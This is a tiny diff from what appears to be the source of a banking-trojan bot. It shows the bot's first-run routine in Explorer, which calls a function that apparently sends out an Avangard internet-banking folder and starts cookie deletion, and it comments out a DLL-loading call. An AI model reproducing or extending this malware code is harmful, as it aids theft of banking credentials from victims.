@@ -24,7 +24,7 @@ void ExplorerFirstStart(PEventData Data)
 		AvangardWeb::SendFolder_avn_ib();
 	#endif
 	
-	ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
+	//ExecuteLoadDLLDisk( 0, 0, "testdll.dll" );
 	// Первый запуск бота в проводнике
 
 	// Запускаем удаление кукисов
